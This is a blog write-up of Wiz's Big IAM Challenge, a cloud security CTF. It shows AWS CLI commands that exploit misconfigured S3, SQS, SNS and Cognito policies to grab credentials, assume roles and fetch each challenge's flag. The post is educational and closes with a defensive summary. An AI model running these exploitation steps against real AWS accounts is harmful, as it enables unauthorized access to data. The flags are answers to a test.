---
layout: post
title:  "Wiz’s IAM Challenge: What I Learned"
date:   2023-07-27 09:30:00 -0400
categories: technical aws
image: /assets/img/wiz-iam-challenge/wiz-iam-header.png
---

*Learning from Wiz’s Big IAM Challenge in AWS.*

In the leadup to [fwd:cloudsec](https://fwdcloudsec.org/) last month, the Wiz team released [The Big IAM Challenge](https://bigiamchallenge.com/challenge/1). While I didn’t have time to work on this CTF ahead of the conference, it was top of my list to work through when I returned!

I’ve organized my challenge notes below by service category (S3, SQS/SNS, Cognito), and added background to understand the security concern in each challenge on top of its solution. As someone whose current focus is on Azure, I was curious to learn more about the AWS side of the cloud.

A huge thank you to [Infrasec’s writeup](https://infrasec.sh/post/iam_ctf/#challenge-5) and Wes Ladd’s [hackingthe.cloud](http://hackingthe.cloud) posts on Cognito ([Unintended Self-Signup](https://hackingthe.cloud/aws/exploitation/cognito_user_self_signup/), [Overpermissioned Identity Pool](https://hackingthe.cloud/aws/exploitation/cognito_identity_pool_excessive_privileges/)) for hints as I progressed, and most of all to Wiz for running this challenge! This was a fantastic learning experience.

If you’re up for it, pop open the challenge and follow along:

> [The Big IAM Challenge](https://bigiamchallenge.com/challenge/1): *Your challenge starts here!! No account required.*
{: .prompt-tip }

# S3 Challenges

## Public S3 Access (Challenge #1)

### Summary

Challenge #1 demonstrated a public bucket policy that allowed any Principal (authenticated or not) to access the `files/*` directory. This allowed fetching `files/flag1.txt` from the challenge’s cloud console for a quick win!

### Details

Each challenge provides an IAM policy that is vulnerable in some way, related to one of a few AWS services. For example, each challenge begins with “View IAM Policy” to show the vulnerable policy:

![challenge-1-intro.png](/assets/img/wiz-iam-challenge/challenge-1-intro.png)

<sub>*(I’ve provided the above as an example of where each IAM policy comes from, but in the interest of space will skip for subsequent challenges.)*</sub>

The first IAM policy provided allowed any Principal to perform the `s3:GetObject` action, as well as s3:ListBucket for `files/*`:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```

This made it possible to list all files in the bucket with `aws s3api`, using the known bucket name from the IAM policy:

```bash
> aws s3api list-objects --bucket thebigiamchallenge-storage-9979f4b
{
    "Contents": [
        {
            "Key": "files/flag1.txt",
[...]
```

After this, `aws s3 cp` could be used to fetch the flag:

```bash
> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
{wiz:exposed-storage-risky-as-usual}
```

A note here: As the cloud shell provided for these challenges was read-only, `aws s3 cp` needed the `-` parameter to dump to `stdout` (as the file could not be copied locally).

*If you’re following along in the challenge portal, skip to [SNS/SQS Challenges](http://kknowl.es/posts/wiz-iam-challenge/#open-sqs-queue-messages-challenge-2) below to cover Challenges 2 & 3.*

## Improper S3 Access Validation (Challenge #4)

### Summary

Challenge #4 updated Challenge #1's policy to verify if a user’s ARN matches `user/admin` for the account. However, the `ForAllValues` condition used to evaluate this condition **also** evaluates True if no keys are contained in the request. While an authenticated session could not fetch the flag, an anonymous request worked, exposing `files/flag-as-admin.txt`.

### Details

The original IAM policy was modified with a new condition:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

From [AWS documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html#reference_policies_multi-key-or-value-conditions), the `ForAllValues` condition will evaluate requests without keys as “True”:

> The condition returns true if every key value in the request matches at least one value in the policy. ***It also returns true if there are no keys in the request***, or if the key values resolve to a null data set, such as an empty string.
> 

The `--no-sign-request` parameter will send a request without keys, and `--recursive` should pull all contents accessible to the session:

```bash
> aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files - --recursive --no-sign-request
Streaming currently is only compatible with non-recursive cp commands
```

But this one fails, as recursive commands aren’t compatible with the previous `-` for `stdout`!

One weird trick: While it’s not possible **copy** files to the read only cloud shell, one can certainly try to. (Enumeration!) This provides the file names available to the session, based on errors for the attempted copy of each file:

```bash
> aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files . --recursive  --no-sign-request
download failed: s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt to ./flag-as-admin.txt [Errno 30] Read-only file system: '/var/task/flag-as-admin.txt.eda799b5'
download failed: s3://thebigiamchallenge-admin-storage-abf1321/files/logo-admin.png to ./logo-admin.png [Errno 30] Read-only file system: '/var/task/logo-admin.png.d5CB6b78'
```

See the flag file? It can now be fetched just like before, to `stdout`:

```bash
> aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt -
{wiz:principal-arn-is-not-what-you-think}
```

# SQS/SNS Challenges

## Open SQS Queue Messages (Challenge #2)

### Summary

Challenge #2 created a Simple Queue Service (SQS) instance that allowed any Principal to send and receive SQS messages. With the queue’s URL known from the provided IAM policy, the `aws sqs receive-message`  could be used to receive a message, and fetch the flag from the resulting URL the queue exposed.

### Details

The SQS policy provided identifies that any Principal can Send or Receive messages:

```json
{
"Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

Since we already know the queue’s identifiers (Region, Account ID, & Queue Name) from the above policy, we can use this to construct the queue URL and receive a message with `aws sqs receive-message`:

```bash
> aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
{
    "Messages": [
        {
            "MessageId": "4c994dfa-4989-4cbf-83d1-588dd720f924",
            "ReceiptHandle": "[...]",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.35046
libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}"
        }
    ]
}
```

Including the Account ID from the ARN for this resource is important when constructing the `--queue-url` for SQS - unlike for S3, where bucket names are global and do not require the Account ID. *(This tripped me up for a bit!)* 

Accessing the URL that was exposed in the queue message above, the flag can now be fetched:

![challenge-2-flag.png](/assets/img/wiz-iam-challenge/challenge-2-flag.png)

## Insufficient SNS Validation (Challenge #3)

### Summary

Challenge #3 presented a trickier spin: subscribing to the Simple Notification Service (SNS). The IAM policy for this service allowed any Principal to subscribe to SNS, so long as the subscribed destination (email, URL, etc) ended in `*@tbic.wiz.io`… but no requirement to use email as a protocol! This allowed an HTTPS URL ending with the string `@tbic.wiz.io` to be approved for subsciption. By using Ngrok, a URL including this string could be registered to receive the flag.

### Details

The IAM policy for SNS identifies that any Principal may [Subscribe](https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html), so long as `sns:Endpoint` ends in `@tbic.wiz.io`:

```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

Acess to @tbic.wiz.io emails is unlikely in this case, as it would require compromise well outside of this lab. Using `aws sns subscribe` to add an invalid email address (as expected) does not work out. However, a test attempt to add a random URL ending in `/test@tbic.wiz.io` receives “pending confirmation”:

```bash
> aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol http \
    --notification-endpoint "http://8.8.8.8/test@tbic.wiz.io"
{
    "SubscriptionArn": "pending confirmation"
}
```

While there’s several ways to create a publicly listening HTTP endpoint, a friend recommended [ngrok](https://ngrok.com/) as a quick way to receive messages to a VM through very limited, momentary exposure. Setup was smooth! In a VM, launch ngrok with a port number the host will listen on:

```bash
$ ./ngrok http 81
```

In another terminal session, listen on the chosen port:

```bash
$ nc -nvlp 81
```

The ngrok tool configures port forwarding, and provides a URL for public access. This URL can then be used to `aws sns subscribe` a new subscription, ending in the specified domain:

```bash
> aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol https \
    --notification-endpoint "https://[REMOVED].ngrok-free.app/test@tbic.wiz.io"
{
    "SubscriptionArn": "pending confirmation"
}
```

Back in the VM, the SNS service delivers a verification URL to ngrok that is forwarded to our listener! Visiting the `SubscribeURL` will confirm the subscription and allow the session to receive any messages:

```bash
$ nc -nvlp 81                                                                                                                                   1 ⨯
listening on [any] 81 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37214
POST /test@tbic.wiz.io HTTP/1.1
Host: [REMOVED].ngrok-free.app
User-Agent: Amazon Simple Notification Service Agent
[...]
X-Amz-Sns-Message-Type: SubscriptionConfirmation
X-Amz-Sns-Topic-Arn: arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications
X-Forwarded-For: 54.239.98.24
X-Forwarded-Proto: https
{
  "Type" : "SubscriptionConfirmation",
  [...]
  "Message" : "You have chosen to subscribe to the topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications.\nTo confirm the subscription, visit the SubscribeURL included in this message.",
  "SubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=[...]",
[...]
```

Sure enough, once the URL has been visited the SNS service reaches out again to the listener with a flag:

```bash
POST /test@tbic.wiz.io HTTP/1.1
Host: [REMOVED].ngrok-free.app
User-Agent: Amazon Simple Notification Service Agent
[...]
X-Amz-Sns-Message-Type: Notification
X-Amz-Sns-Subscription-Arn: arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:61410a35-fb43-4796-aba0-d0e6e0129d62
X-Amz-Sns-Topic-Arn: arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications
X-Forwarded-For: 72.21.217.141
X-Forwarded-Proto: https
{
  "Type" : "Notification",
[...]
  "Message" : "{wiz:always-suspect-asterisks}",
  "Timestamp" : "2023-06-21T19:18:08.511Z",
[...]
  "UnsubscribeURL" : "https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:61410a35-fb43-4796-aba0-d0e6e0129d62"
}
```

# Cognito Challenges

The last two challenges focused on Amazon Cognito, an area I was completely new to. Cognito provides identity services for AWS, and can be configured to allow users to sign up, sign in, and access applications created in AWS. If not configured correctly, Cognito can have several issues - especially around user sign up and permissions.

## Cognito Unintended Sign Up (Challenge #5)

### Summary

Challenge #5 exposed the `IdentityPoolId` for the Cognito service. If the Identity Pool ID is exposed and “Admin Only” user signup is not enabled for Cognito’s User Pool, any user with this ID may be able to sign up to the Cognito service and access the application with default user permissions (as opposed to just allowed admins creating new users).

In this case, the `IdentityPoolId` was already used in application source code to generate user credentials and fetch an image. Fetching these credentials from the page’s source code made it simple to access the flag.

### Details

The Cognito IAM policy for Challenge #5 allows any user to Get and List in the `wiz-privatefiles` storage bucket:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```

Reviewing the challenge page, an image of the AWS Cognito logo seems to have appeared. Inspecting that image (right-click “Inspect” in Chrome), an `AWSAccessKeyId` is revealed. Very interesting!

![challenge-5-1.png](/assets/img/wiz-iam-challenge/challenge-5-1.png)

While this access key alone won’t grant access, it indicates that something in the page is generating this session. Sure enough, just below this image is a script:

![challenge-5-2.png](/assets/img/wiz-iam-challenge/challenge-5-2.png)

This script generates a set of credentials using `AWS.CognitoIdentityCredentials` and saves them to `AWS.config.credentials` using the Cognito `IdentityPoolId` exposed in the script’s code. (More on that in Challenge #6!)

By accessing the value of the `AWS.config.credentials` object in Developer Tools, all session details used to fetch the image (or use via CLI) are provided: `accessKeyId`, `sessionToken`, and `secretAccessKey`:

![challenge-5-3.png](/assets/img/wiz-iam-challenge/challenge-5-3.png)

For a different form of fun, the Network tab of Developer Tools can also be used to capture this information as it is fetched from the AWS Cognito service. Watch for network traffic from Cognito in this case:

![challenge-5-4.png](/assets/img/wiz-iam-challenge/challenge-5-4.png)

Whichever way they were fetched, these identity details can now be configured in a local terminal session and used to find & fetch the flag!

```bash
$ export AWS_ACCESS_KEY_ID=ASIA[...]
$ export AWS_SECRET_ACCESS_KEY=[...]
$ export AWS_SESSION_TOKEN="[...]"
$ aws s3 ls s3://wiz-privatefiles
2023-06-05 15:42:27       4220 cognito1.png
2023-06-05 09:28:35         37 flag1.txt
$ aws s3 cp s3://wiz-privatefiles/flag1.txt -
{wiz:incognito-is-always-suspicious}
```

## Cognito Over-Permissioned Identity Pool (Challenge #6)

### Summary

Challenge #6 focused on insecure role assignments, and built on Challenge #5’s risky `IdentityPoolId` exposure. Based on the provided IAM policy, any user authenticated to Cognito’s Identity Pool could assume the ARN of a known role.

Getting to this role required several steps:

1. Fetching an `IdentityId` from Cognito based on a known `IdentityPoolId`,
2. Using the `IdentityId` to fetch an OpenID token,
3. Using the OpenID token to assume the known role via the Security Token Service (STS),
4. Using the credentials from STS in a session to list available files and fetch the flag!

### Details

The provided IAM policy shows that federated logins through this Cognito Identity Pool are allowed to `AssumeRoleWithWebIdentity`:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

The details of a role to assume are also provided:

![challenge-6-1.png](/assets/img/wiz-iam-challenge/challenge-6-1.png)

What’s the path to getting a federated login? Starting with the known `--identity-pool-id` and region, it’s possible to fetch an `IdentityId` via `aws cognito-identity get-id`: 

```bash
$ aws cognito-identity get-id --region us-east-1 --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "us-east-1:6626f2bf-6854-408d-aa01-be0a3d9357ef"
}
```

This `IdentityId` can be provided back to Cognito to receive a token that for authentication to other AWS services from `get-open-id-token`:

```bash
$ aws cognito-identity get-open-id-token --identity-id us-east-1:6626f2bf-6854-408d-aa01-be0a3d9357ef
{
    "IdentityId": "us-east-1:6626f2bf-6854-408d-aa01-be0a3d9357ef",
    "Token": "[...]"
}
```

The catch: Since this account has been authenticated (as a user that was illicitly created!), the account can now `AssumeRoleWithWebIdentity`**.**

Combining the known role ARN provided for this challenge (above) with the `--web-identity-token` (`Token` from the previous command) and a specified arbitrary `--role-session-name`, the credentials for a new session with this role are provided:

```bash
$ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name test --web-identity-token "[...]"
{
    "Credentials": {
        "AccessKeyId": "ASIA[...]",
        "SecretAccessKey": "[...]",
        "SessionToken": "[...]",
        "Expiration": "2023-06-23T14:42:44+00:00"
    },
    "SubjectFromWebIdentityToken": "us-east-1:6626f2bf-6854-408d-aa01-be0a3d9357ef",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:test",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/test"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
```

By using these credentials in a local terminal session, full access to the storage bucket is now possible (as the role has access to S3) and the flag is obtained:

```bash
$ export AWS_ACCESS_KEY_ID=ASIA[...]
$ export AWS_SECRET_ACCESS_KEY=[...]
$ export AWS_SESSION_TOKEN="[...]"
$ aws s3 ls
2023-06-04 13:07:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 09:07:44 thebigiamchallenge-admin-storage-abf1321
2023-06-04 12:31:02 thebigiamchallenge-storage-9979f4b
2023-06-05 09:28:31 wiz-privatefiles
2023-06-05 09:28:31 wiz-privatefiles-x1000
$ aws s3 ls s3://wiz-privatefiles-x1000
2023-06-05 15:42:27       4220 cognito2.png
2023-06-05 09:28:35         40 flag2.txt
$ aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt -
{wiz:open-sesame-or-shell-i-say-openid}
```

# Conclusion

If you’ve made it this far, congrats! I hope you’ve picked up a couple new thoughts about AWS along the way. To recap all the security concerns this challenge covered:

### S3 Issues

- **Public S3 Access:** Allowing all user principals (including unauthenticated) to list and access files in an S3 bucket.
- **Improper S3 Access Validation:** Using `ForAllValues` to verify a user’s identity, which “fails open” to allow a user with no authenticated session to list and access files in an S3 bucket.

### SQS/SNS Issues

- **Open SQS Queue:** Allowing any user principal (including unauthenticated) to send and receive SQS messages, which may contain sensitive information.
- **Insufficient SNS Validation:** Allowing only a specific string ending (email domain) to subscribe to SNS, but not limiting the methods of subscription! This control was bypassed by a URL ending in the specified email string.

### Cognito Challenges

- **Cognito Unintended Sign Up:** Exposing the Cognito Identity Pool ID through web application code, allowing registration of a new user from anyone with the Identity Pool ID, and allowing any authenticated user session access to list and access files in an S3 bucket.
- **Cognito Over-Permissioned Identity Pool:** Allowing any user authenticated through Cognito to assume a role that could be used to list and access files in an S3 bucket.

Thanks for joining me for the journey, and I hope you take the chance to play with this challenge if you haven’t already - it’s a fun one! 🐈‍⬛